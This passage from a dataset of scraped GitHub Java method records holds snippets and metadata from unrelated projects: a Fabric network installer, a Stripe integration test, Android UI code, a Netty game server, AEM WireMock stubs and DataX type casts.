FileUtil.makeFilePath(packSrcPath, true);        for (RoleEnum role : roleList) {            this.copyFiles(role, serverAddress, packSrcPath, configEntity);        }        // \u6253\u5305        try {            String packFilePath = rootPath + \"InstallPackage.tar.gz\";            byte[] data = Utils.generateTarGz(new File(packSrcPath), \"\", null);            FileOutputStream os = new FileOutputStream(packFilePath, false);            os.write(data);            os.close();            FileUtil.rmFile(new File(packSrcPath));            return packFilePath;        } catch (IOException e) {            // log.error(\"\u751f\u6210\u667a\u80fd\u5b89\u88c5\u5305\u65f6\u5f02\u5e38\", e);            log.error(\"Exception when generating smart installation package\", e);            e.printStackTrace();        }        return \"\";    }", "url": "https://raw.githubusercontent.com/zeoio/fabric-toolkit/master/bcp-install-biz/src/main/java/com/cgb/bcpinstall/service/FileService.java", "stars": "7", "class": {"name": "FileService", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "packExtendNodeFiles", "params": ["String", "String", "RoleEnum", "InitConfigEntity"], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String packExtendNodeFiles(String serverAddress, String folderName, RoleEnum roleEnum, InitConfigEntity configEntity) {        String role = \"\";        switch (roleEnum) {            case PEER:                role = \"peer\";                break;            case ORDER:                role = \"orderer\";                break;        }        // log.info(String.format(\"\u4e3a\u65b0 %s \u8282\u70b9 %s \u51c6\u5907\u667a\u80fd\u5b89\u88c5\u5305\", role, serverAddress));        log.info(String.format(\"Prepare the package to install the smart contracts  for new %s node %s\", role, serverAddress));        // \u5efa\u4e00\u4e2a\u4e34\u65f6\u76ee\u5f55        String tmpPath = System.getProperty(\"java.io.tmpdir\");        if (!tmpPath.endsWith(File.separator)) {            tmpPath = tmpPath + File.separator;        }        String rootPath = tmpPath + UUID.randomUUID().toString().replaceAll(\"-\", \"\") + File.separator;        String packSrcPath = rootPath + \"installFiles\" + File.separator;        FileUtil.makeFilePath(packSrcPath, true);        this.copyFiles(roleEnum, serverAddress, folderName, packSrcPath, folderName, configEntity, null);        // \u6253\u5305        try {            String packFilePath = rootPath + \"InstallPackage.tar.gz\";            byte[] data = Utils.generateTarGz(new File(packSrcPath), \"\", null);            FileOutputStream os = new FileOutputStream(packFilePath, false);            os.write(data);            os.close();            FileUtil.rmFile(new File(packSrcPath));            return packFilePath;        } catch (IOException e) {            // log.error(\"\u751f\u6210\u667a\u80fd\u5b89\u88c5\u5305\u65f6\u5f02\u5e38\", e);            log.error(\"Exception when generating the package for the smart contracts \", e);            e.printStackTrace();        }        return \"\";    }", "url": "https://raw.githubusercontent.com/zeoio/fabric-toolkit/master/bcp-install-biz/src/main/java/com/cgb/bcpinstall/service/FileService.java", "stars": "7", "class": {"name": "FileService", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "removeCertFile", "params": ["RoleEnum", "InitConfigEntity", "Map<String,String>", "boolean"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void removeCertFile(RoleEnum role, InitConfigEntity configEntity, Map<String, String> nodeHostMap, boolean isInitDir) {        for (String nodeHost : nodeHostMap.keySet()) {            String cryptoFilePath = \"crypto-config\" + File.separator + \"%s\" + File.separator + \"%s\" + File.separator + \"%s\" + File.separator + \"%s\";            String peerCertPath = String.format(cryptoFilePath, \"peerOrganizations\", configEntity.getPeerDomain(), \"peers\", nodeHost);            String ordererCertPath = String.format(cryptoFilePath, \"ordererOrganizations\", configEntity.getOrdererDomain(), \"orderers\", nodeHost);            String rmPath;            if (role == RoleEnum.PEER) {                if (isInitDir) {                    rmPath = modeService.getInitDir() + \"fabric-net\" + File.separator + \"cryptoAndConfig\" + File.separator + peerCertPath;                } else {                    rmPath = modeService.getInstallPath() + peerCertPath;                }            } else {                if (isInitDir) {                    rmPath = modeService.getInitDir() + \"fabric-net\" + File.separator + \"cryptoAndConfig\" + File.separator + ordererCertPath;                } else {                    rmPath = modeService.getInstallPath() + ordererCertPath;                }            }            // log.info(\"\u7f29\u5bb9\u8282\u70b9\uff0c\u79fb\u9664\u8bc1\u4e66\u8def\u5f84\uff1a\" + rmPath);            log.info(\"scale down nodes, remove certificate path: \" + rmPath);            FileUtil.rmFile(new File(rmPath));        }    }", "url": "https://raw.githubusercontent.com/zeoio/fabric-toolkit/master/bcp-install-biz/src/main/java/com/cgb/bcpinstall/service/FileService.java", "stars": "7", "class": {"name": "FileService", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "init", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void init() {        createOwner();        gardenField = new GardenField();        gardenField.setName(GARDEN_NAME);        gardenField.setSizeInM2(SIZE_IN_M2);        gardenField.setPricePerM2(PRICE_PER_M2);        gardenField.setLatitude(LATITUDE);        gardenField.setLongitude(LONGITUDE);        gardenField.setCity(CITY);        gardenField.setRoofed(ROOFED);        gardenField.setGlassHouse(GLASS_HOUSE);        gardenField.setHigh(HIGH);        gardenField.setWater(WATER);        gardenField.setElectricity(ELECTRICITY);        gardenField.setPhValue(PH_VALUE);        gardenField.setOwner(owner);        gardenFieldRepository.save(gardenField);        creatorLeasingDTO = new CreatorLeasingDTO();        creatorLeasingDTO.setGardenFieldId(gardenField.getId());        creatorLeasingDTO.setFrom(Instant.now().plus(100, ChronoUnit.DAYS));        creatorLeasingDTO.setTo(creatorLeasingDTO.getFrom().plus(100, ChronoUnit.DAYS));        creatorLeasingDTO.setGardenFieldName(\"gardenfield name\");        Stripe.apiKey = stripeApiKey;    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/service/StripeServiceIT.java", "stars": "2", "class": {"name": "StripeServiceIT", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "testCreateCheckoutSession", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void testCreateCheckoutSession() {        AbstractCheckoutDTO result = stripeService.createCheckoutSession(creatorLeasingDTO);        assertThat(result).isNotNull();        assertThat(result.getId()).isNotNull();    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/service/StripeServiceIT.java", "stars": "2", "class": {"name": "StripeServiceIT", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "testCreateAccount", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void testCreateAccount() {        String res = stripeService.createAccount(new CreatePaymentProviderAccountDTO(DEFAULT_EMAIL, DEFAULT_IBAN));        assertThat(res).isNotNull();        assertThat(res).isNotEmpty();    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/service/StripeServiceIT.java", "stars": "2", "class": {"name": "StripeServiceIT", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "testGetAccountLinkUrl", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void testGetAccountLinkUrl() {        String res = stripeService.getAccountLinkUrl(new GetStripeAccountLinkUrlDTO(stripeService.createAccount(new CreatePaymentProviderAccountDTO(DEFAULT_EMAIL, DEFAULT_IBAN)),            \"\"));        assertThat(res).isNotNull();        assertThat(res).isNotEmpty();    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/service/StripeServiceIT.java", "stars": "2", "class": {"name": "StripeServiceIT", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "createOwner", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void createOwner() {        owner = new User();        owner.setLogin(OWNER_LOGIN);        owner.setPassword(RandomStringUtils.random(60));        owner.setActivated(true);        owner.setEmail(RandomStringUtils.randomAlphabetic(5) + DEFAULT_EMAIL);        owner.setFirstName(\"owner\");        owner.setLastName(\"owner\");        owner.setBankAccountIBAN(DEFAULT_IBAN);        userRepository.save(owner);    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/test/java/com/gardle/service/StripeServiceIT.java", "stars": "2", "class": {"name": "StripeServiceIT", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "onQueryTextChange", "params": ["java"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "\tpublic boolean onQueryTextChange (java.lang.String p0)\t{\t\treturn n_onQueryTextChange (p0);\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/SearchBarRenderer.java", "stars": "2", "class": {"name": "SearchBarRenderer", "extends": "crc643f46942d9dd1fff9", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"method_name": "n_onQueryTextChange", "params": ["java"], "throws": null, "modifiers": ["native", "private"], "return_type": "boolean", "snippet": "\tprivate native boolean n_onQueryTextChange (java.lang.String p0);\tpublic boolean onQueryTextSubmit (java.lang.String p0)\t{\t\treturn n_onQueryTextSubmit (p0);\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/SearchBarRenderer.java", "stars": "2", "class": {"name": "SearchBarRenderer", "extends": "crc643f46942d9dd1fff9", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"method_name": "onQueryTextSubmit", "params": ["java"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "\tpublic boolean onQueryTextSubmit (java.lang.String p0)\t{\t\treturn n_onQueryTextSubmit (p0);\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/SearchBarRenderer.java", "stars": "2", "class": {"name": "SearchBarRenderer", "extends": "crc643f46942d9dd1fff9", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"method_name": "n_onQueryTextSubmit", "params": ["java"], "throws": null, "modifiers": ["native", "private"], "return_type": "boolean", "snippet": "\tprivate native boolean n_onQueryTextSubmit (java.lang.String p0);\tprivate java.util.ArrayList refList;\tpublic void monodroidAddReference (java.lang.Object obj)\t{\t\tif (refList == null)\t\t\trefList = new java.util.ArrayList ();\t\trefList.add (obj);\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/SearchBarRenderer.java", "stars": "2", "class": {"name": "SearchBarRenderer", "extends": "crc643f46942d9dd1fff9", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"method_name": "monodroidAddReference", "params": ["java"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void monodroidAddReference (java.lang.Object obj)\t{\t\tif (refList == null)\t\t\trefList = new java.util.ArrayList ();\t\trefList.add (obj);\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/SearchBarRenderer.java", "stars": "2", "class": {"name": "SearchBarRenderer", "extends": "crc643f46942d9dd1fff9", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"method_name": "monodroidClearReferences", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void monodroidClearReferences ()\t{\t\tif (refList != null)\t\t\trefList.clear ();\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/SearchBarRenderer.java", "stars": "2", "class": {"name": "SearchBarRenderer", "extends": "crc643f46942d9dd1fff9", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"method_name": "triggerIndexing", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void triggerIndexing() {        try {            fullTextEntityManager.createIndexer().startAndWait();            LOGGER.debug(\"Lucene index created\");        } catch (InterruptedException e) {            throw new RuntimeException(e);        }    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/main/java/com/gardle/config/LuceneIndexServiceBean.java", "stars": "2", "class": {"name": "LuceneIndexServiceBean", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "run", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void run() {        handleMessageQueue();    }", "url": "https://raw.githubusercontent.com/wangxingman/my_project/master/netty_game_app/netty_game_server/src/main/java/com/game/socket/logic/MessageWorkerByte.java", "stars": "1", "class": {"name": "MessageWorkerByte", "extends": null, "implements": ["Runnable"], "modifiers": ["public"]}}, {"method_name": "handleMessageQueue", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void handleMessageQueue() {        AbstractNetMessage abstractNetMessage = messageDecoderFactoryApp.parseMessage(requestMessage.getByteBuf());        NetMessageHead messageHead = abstractNetMessage.getMessageHead();        boolean verify = this.verify(messageHead);        if(!verify) {            Request request = requestMessage.getRequest();            ChannelHandlerContext channelHandlerContext = request.getChannelHandlerContext();            channelHandlerContext.writeAndFlush(new BinaryWebSocketFrame(messageEncoderFactoryApp.createByteBuf(new AbstractNetMessage())));        }        //todo \u8fd9\u91cc\u4f7f\u7528\u504f\u79fb\u91cf\u8f6c\u4e3a\u5b57\u7b26\u4e32        byte[] bytes = abstractNetMessage.getMessageBody().getBytes();        DataPacket dataPacket = DataPacket.builder().cmd(abstractNetMessage.getMessageHead().getCmd()).data(String.valueOf(bytes)).build();        handler.handlerMessage(requestMessage.getRequest(),dataPacket);    }", "url": "https://raw.githubusercontent.com/wangxingman/my_project/master/netty_game_app/netty_game_server/src/main/java/com/game/socket/logic/MessageWorkerByte.java", "stars": "1", "class": {"name": "MessageWorkerByte", "extends": null, "implements": ["Runnable"], "modifiers": ["public"]}}, {"method_name": "verify", "params": ["NetMessageHead"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean verify(NetMessageHead messageHead) {        return true;    }", "url": "https://raw.githubusercontent.com/wangxingman/my_project/master/netty_game_app/netty_game_server/src/main/java/com/game/socket/logic/MessageWorkerByte.java", "stars": "1", "class": {"name": "MessageWorkerByte", "extends": null, "implements": ["Runnable"], "modifiers": ["public"]}}, {"method_name": "onCreate", "params": ["Bundle"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void onCreate(Bundle savedInstanceState) {        super.onCreate(savedInstanceState);        setContentView(R.layout.activity_detail);        //ActionBar and its title        ActionBar actionBar = getSupportActionBar();        //enable back button        actionBar.setDisplayHomeAsUpEnabled(true);        actionBar.setDisplayShowHomeEnabled(true);        Intent intent = getIntent();        if (intent == null) {            closeOnError();        }        int position = intent.getIntExtra(EXTRA_POSITION, DEFAULT_POSITION);        if (position == DEFAULT_POSITION) {            // EXTRA_POSITION not found in intent            closeOnError();            return;        }        String[] sandwiches = getResources().getStringArray(R.array.sandwich_details);        String json = sandwiches[position];        Sandwich sandwich = JsonUtils.parsesandwichJson(json);        if (sandwich == null) {            // Sandwich data unavailable            closeOnError();            return;        }        initViews();        populateUI(sandwich);        dimageView.setTransitionName(String.valueOf(position));        Picasso.get()                .load(sandwich.getImage())                .placeholder(R.drawable.placeholder)                .error(R.drawable.error_loding)                .into(dimageView, new Callback() {                    @Override                    public void onSuccess() {                        progressBar.setVisibility(View.GONE);                    }                    @Override                    public void onError(Exception e) {                    }                });        setTitle(sandwich.getMainName());    }", "url": "https://raw.githubusercontent.com/Aman817/Sandwich_Club/master/app/src/main/java/com/aman/sandwichclub/DetailActivity.java", "stars": "2", "class": {"name": "DetailActivity", "extends": "AppCompatActivity", "implements": ["Animation"], "modifiers": ["public"]}}, {"method_name": "populateUI", "params": ["Sandwich"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void populateUI(Sandwich sandwich) {        titleTV.setText(sandwich.getMainName());        descriptionTV.setText(sandwich.getDescription());        if (sandwich.getPlaceOfOrigin().isEmpty() || sandwich.getPlaceOfOrigin().equals(\" \")) {            doriginTV.setText(getResources().getString(R.string.not_avail));        } else {            doriginTV.setText(sandwich.getPlaceOfOrigin());        }        settingList(sandwich.getIngredients(), dingredientsTV);        settingList(sandwich.getAlsoKnownAs(), dalsoKnowTV);    }", "url": "https://raw.githubusercontent.com/Aman817/Sandwich_Club/master/app/src/main/java/com/aman/sandwichclub/DetailActivity.java", "stars": "2", "class": {"name": "DetailActivity", "extends": "AppCompatActivity", "implements": ["Animation"], "modifiers": ["public"]}}, {"method_name": "settingList", "params": ["List<String>", "TextView"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void settingList(List<String> alsoKnownAs, TextView dalsoKnowTV) {        if (alsoKnownAs.isEmpty()) {            dalsoKnowTV.setText(getResources().getString(R.string.not_avail));            return;        }        StringBuilder data = new StringBuilder();        for (int i = 0; i < alsoKnownAs.size(); i++) {            data.append(alsoKnownAs.get(i));            if (i != alsoKnownAs.size() - 1)                data.append(\",\");        }        dalsoKnowTV.setText(data.toString().replace(\",\", \"\\n\"));    }", "url": "https://raw.githubusercontent.com/Aman817/Sandwich_Club/master/app/src/main/java/com/aman/sandwichclub/DetailActivity.java", "stars": "2", "class": {"name": "DetailActivity", "extends": "AppCompatActivity", "implements": ["Animation"], "modifiers": ["public"]}}, {"method_name": "initViews", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void initViews() {        progressBar = findViewById(R.id.thumb_progressbar);        titleTV = findViewById(R.id.title_tv);        descriptionTV = findViewById(R.id.description_tv);        doriginTV = findViewById(R.id.origin_tv);        dingredientsTV = findViewById(R.id.ingredients_tv);        dalsoKnowTV = findViewById(R.id.also_known_tv);        dimageView = findViewById(R.id.image_iv);        bottomScrimView = findViewById(R.id.bottom_scrim);        descriptionBox = findViewById(R.id.description_box);        ingredientsBox = findViewById(R.id.ingredients_box);        alsoKnowAsBox = findViewById(R.id.also_known_as_box);        fadeInAnim = AnimationUtils.loadAnimation(this, android.R.anim.fade_in);        fadeInAnim.setDuration(1000);        fadeInAnim.setAnimationListener(this);        slideDownAnim = AnimationUtils.loadAnimation(this, R.anim.slide_down);        slideDownAnim.setDuration(1000);        slideDownAnim.setAnimationListener(this);        slideUpAnim = AnimationUtils.loadAnimation(this, R.anim.slide_up);        slideUpAnim.setDuration(1000);        slideUpAnim.setAnimationListener(this);        slideUpAnimOne = AnimationUtils.loadAnimation(this, R.anim.slide_up);        slideUpAnimOne.setDuration(500);        slideUpAnimOne.setAnimationListener(this);        slideOutDown = AnimationUtils.loadAnimation(this, R.anim.slide_out_down);        slideOutDown.setAnimationListener(this);        slideOutDownOne = AnimationUtils.loadAnimation(this, R.anim.slide_out_down);        slideOutDownOne.setAnimationListener(this);        slideOutUp = AnimationUtils.loadAnimation(this, R.anim.slide_out_up);        slideOutUp.setAnimationListener(this);        fadeOutAnim = AnimationUtils.loadAnimation(this, android.R.anim.fade_out);        fadeOutAnim.setDuration(500);        fadeOutAnim.setAnimationListener(this);        bottomScrimView.startAnimation(fadeInAnim);    }", "url": "https://raw.githubusercontent.com/Aman817/Sandwich_Club/master/app/src/main/java/com/aman/sandwichclub/DetailActivity.java", "stars": "2", "class": {"name": "DetailActivity", "extends": "AppCompatActivity", "implements": ["Animation"], "modifiers": ["public"]}}, {"method_name": "closeOnError", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void closeOnError() {        finish();        Toast.makeText(this, R.string.detail_error_message, Toast.LENGTH_SHORT).show();    }", "url": "https://raw.githubusercontent.com/Aman817/Sandwich_Club/master/app/src/main/java/com/aman/sandwichclub/DetailActivity.java", "stars": "2", "class": {"name": "DetailActivity", "extends": "AppCompatActivity", "implements": ["Animation"], "modifiers": ["public"]}}, {"method_name": "onAnimationStart", "params": ["Animation"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onAnimationStart(Animation animation) {    }", "url": "https://raw.githubusercontent.com/Aman817/Sandwich_Club/master/app/src/main/java/com/aman/sandwichclub/DetailActivity.java", "stars": "2", "class": {"name": "DetailActivity", "extends": "AppCompatActivity", "implements": ["Animation"], "modifiers": ["public"]}}, {"method_name": "onAnimationEnd", "params": ["Animation"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onAnimationEnd(Animation animation) {        if (animation == fadeInAnim) {            descriptionBox.setVisibility(View.VISIBLE);            descriptionBox.setAnimation(slideDownAnim);        }        if (animation == slideDownAnim) {            ingredientsBox.setVisibility(View.VISIBLE);            ingredientsBox.setAnimation(slideUpAnim);        }        if (animation == slideUpAnim) {            alsoKnowAsBox.setVisibility(View.VISIBLE);            alsoKnowAsBox.setAnimation(slideUpAnimOne);            enableBackBtn = true;        }        if (animation == slideOutDown) {            alsoKnowAsBox.setVisibility(View.INVISIBLE);            ingredientsBox.setAnimation(slideOutDownOne);        }        if (animation == slideOutDownOne) {            ingredientsBox.setVisibility(View.INVISIBLE);            descriptionBox.setAnimation(slideOutUp);        }        if (animation == slideOutUp) {            descriptionBox.setVisibility(View.INVISIBLE);            bottomScrimView.startAnimation(fadeOutAnim);        }        if (animation == fadeOutAnim) {            bottomScrimView.setVisibility(View.INVISIBLE);            super.onBackPressed();        }    }", "url": "https://raw.githubusercontent.com/Aman817/Sandwich_Club/master/app/src/main/java/com/aman/sandwichclub/DetailActivity.java", "stars": "2", "class": {"name": "DetailActivity", "extends": "AppCompatActivity", "implements": ["Animation"], "modifiers": ["public"]}}, {"method_name": "onAnimationRepeat", "params": ["Animation"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onAnimationRepeat(Animation animation) {    }", "url": "https://raw.githubusercontent.com/Aman817/Sandwich_Club/master/app/src/main/java/com/aman/sandwichclub/DetailActivity.java", "stars": "2", "class": {"name": "DetailActivity", "extends": "AppCompatActivity", "implements": ["Animation"], "modifiers": ["public"]}}, {"method_name": "onBackPressed", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onBackPressed() {        if (enableBackBtn) {            alsoKnowAsBox.startAnimation(slideOutDown);            enableBackBtn = false;        }    }", "url": "https://raw.githubusercontent.com/Aman817/Sandwich_Club/master/app/src/main/java/com/aman/sandwichclub/DetailActivity.java", "stars": "2", "class": {"name": "DetailActivity", "extends": "AppCompatActivity", "implements": ["Animation"], "modifiers": ["public"]}}, {"method_name": "isNotSupported", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "  public boolean isNotSupported() {    return notSupported;  }", "url": "https://raw.githubusercontent.com/Cognifide/aem-stubs/master/wiremock/src/main/java/com/cognifide/aem/stubs/wiremock/servlet/FaultResponse.java", "stars": "8", "class": {"name": "FaultResponse", "extends": null, "implements": null, "modifiers": ["final"]}}, {"method_name": "sendError", "params": ["HttpServletResponse"], "throws": ["IOException"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void sendError(HttpServletResponse servletResponse) throws IOException {    servletResponse.sendError(statusCode, msg);  }", "url": "https://raw.githubusercontent.com/Cognifide/aem-stubs/master/wiremock/src/main/java/com/cognifide/aem/stubs/wiremock/servlet/FaultResponse.java", "stars": "8", "class": {"name": "FaultResponse", "extends": null, "implements": null, "modifiers": ["final"]}}, {"method_name": "fromResponse", "params": ["Response"], "throws": null, "modifiers": ["public", "static"], "return_type": "FaultResponse", "snippet": "  public static FaultResponse fromResponse(Response response) {    if (!response.wasConfigured()) {      return FaultResponse.notSupportedResponse(\"No stub defined for this request\", 404);    }    if (response.shouldAddChunkedDribbleDelay()) {      return FaultResponse        .notSupportedResponse(\"Chunked dribble delay not supported by AEM Stubs\");    }    Fault fault = response.getFault();    if (fault != null) {      return FaultResponse        .notSupportedResponse(          String.format(\"%s not supported by AEM Stubs\", fault.name()));    }    if (response.getInitialDelay() != 0) {      return FaultResponse        .notSupportedResponse(\"Delay not supported by AEM Stubs\");    }    return FaultResponse.supported();  }", "url": "https://raw.githubusercontent.com/Cognifide/aem-stubs/master/wiremock/src/main/java/com/cognifide/aem/stubs/wiremock/servlet/FaultResponse.java", "stars": "8", "class": {"name": "FaultResponse", "extends": null, "implements": null, "modifiers": ["final"]}}, {"method_name": "supported", "params": [], "throws": null, "modifiers": ["private", "static"], "return_type": "FaultResponse", "snippet": "  private static FaultResponse supported() {    return new FaultResponse(false, null, -1);  }", "url": "https://raw.githubusercontent.com/Cognifide/aem-stubs/master/wiremock/src/main/java/com/cognifide/aem/stubs/wiremock/servlet/FaultResponse.java", "stars": "8", "class": {"name": "FaultResponse", "extends": null, "implements": null, "modifiers": ["final"]}}, {"method_name": "notSupportedResponse", "params": ["String"], "throws": null, "modifiers": ["private", "static"], "return_type": "FaultResponse", "snippet": "  private static FaultResponse notSupportedResponse(String msg) {    return new FaultResponse(true, msg, 400);  }", "url": "https://raw.githubusercontent.com/Cognifide/aem-stubs/master/wiremock/src/main/java/com/cognifide/aem/stubs/wiremock/servlet/FaultResponse.java", "stars": "8", "class": {"name": "FaultResponse", "extends": null, "implements": null, "modifiers": ["final"]}}, {"method_name": "notSupportedResponse", "params": ["String", "int"], "throws": null, "modifiers": ["private", "static"], "return_type": "FaultResponse", "snippet": "  private static FaultResponse notSupportedResponse(String msg, int statusCode) {    return new FaultResponse(true, msg, statusCode);  }", "url": "https://raw.githubusercontent.com/Cognifide/aem-stubs/master/wiremock/src/main/java/com/cognifide/aem/stubs/wiremock/servlet/FaultResponse.java", "stars": "8", "class": {"name": "FaultResponse", "extends": null, "implements": null, "modifiers": ["final"]}}, {"method_name": "loading", "params": ["T"], "throws": null, "modifiers": ["public", "static"], "return_type": "Resource<T>", "snippet": "    public static <T> Resource<T> loading(T data) {        return new Resource<>(Status.LOADING, data, null);    }", "url": "https://raw.githubusercontent.com/pengfeigao/AgoraCallApi/master/call-plugin-api/src/main/java/com/basetools/net/Resource.java", "stars": "1", "class": {"name": "Resource", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "success", "params": ["T"], "throws": null, "modifiers": ["public", "static"], "return_type": "Resource<T>", "snippet": "    public static <T> Resource<T> success(T data) {        return new Resource<>(Status.SUCCESS, data, null);    }", "url": "https://raw.githubusercontent.com/pengfeigao/AgoraCallApi/master/call-plugin-api/src/main/java/com/basetools/net/Resource.java", "stars": "1", "class": {"name": "Resource", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "error", "params": ["Exception"], "throws": null, "modifiers": ["public", "static"], "return_type": "Resource<T>", "snippet": "    public static <T> Resource<T> error(Exception e) {        return new Resource<>(Status.ERROR, null, e);    }", "url": "https://raw.githubusercontent.com/pengfeigao/AgoraCallApi/master/call-plugin-api/src/main/java/com/basetools/net/Resource.java", "stars": "1", "class": {"name": "Resource", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "empty", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "Resource<T>", "snippet": "    public static <T> Resource<T> empty() {        return new Resource<>(Status.EMPTY, null, null);    }", "url": "https://raw.githubusercontent.com/pengfeigao/AgoraCallApi/master/call-plugin-api/src/main/java/com/basetools/net/Resource.java", "stars": "1", "class": {"name": "Resource", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getStatus", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getStatus() {        return mStatus;    }", "url": "https://raw.githubusercontent.com/pengfeigao/AgoraCallApi/master/call-plugin-api/src/main/java/com/basetools/net/Resource.java", "stars": "1", "class": {"name": "Resource", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getData", "params": [], "throws": null, "modifiers": ["public"], "return_type": "T", "snippet": "    public T getData() {        return mData;    }", "url": "https://raw.githubusercontent.com/pengfeigao/AgoraCallApi/master/call-plugin-api/src/main/java/com/basetools/net/Resource.java", "stars": "1", "class": {"name": "Resource", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getException", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Exception", "snippet": "    public Exception getException() {        return mException;    }", "url": "https://raw.githubusercontent.com/pengfeigao/AgoraCallApi/master/call-plugin-api/src/main/java/com/basetools/net/Resource.java", "stars": "1", "class": {"name": "Resource", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "bind", "params": ["Configuration"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void bind(final Configuration configuration) {        StringCast.init(configuration);        DateCast.init(configuration);        BytesCast.init(configuration);    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/common/element/ColumnCast.java", "stars": "23", "class": {"name": "ColumnCast", "extends": null, "implements": null, "modifiers": ["public", "final"]}}, {"method_name": "string2Date", "params": ["StringColumn"], "throws": ["ParseException"], "modifiers": ["public", "static"], "return_type": "Date", "snippet": "    public static Date string2Date(final StringColumn column)            throws ParseException {        return StringCast.asDate(column);    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/common/element/ColumnCast.java", "stars": "23", "class": {"name": "ColumnCast", "extends": null, "implements": null, "modifiers": ["public", "final"]}}, {"method_name": "string2Bytes", "params": ["StringColumn"], "throws": ["UnsupportedEncodingException"], "modifiers": ["public", "static"], "return_type": "byte", "snippet": "    public static byte[] string2Bytes(final StringColumn column)            throws UnsupportedEncodingException {        return StringCast.asBytes(column);    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/common/element/ColumnCast.java", "stars": "23", "class": {"name": "ColumnCast", "extends": null, "implements": null, "modifiers": ["public", "final"]}}, {"method_name": "date2String", "params": ["DateColumn"], "throws": null, "modifiers": ["public", "static"], "return_type": "String", "snippet": "    public static String date2String(final DateColumn column) {        return DateCast.asString(column);    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/common/element/ColumnCast.java", "stars": "23", "class": {"name": "ColumnCast", "extends": null, "implements": null, "modifiers": ["public", "final"]}}, {"method_name": "bytes2String", "params": 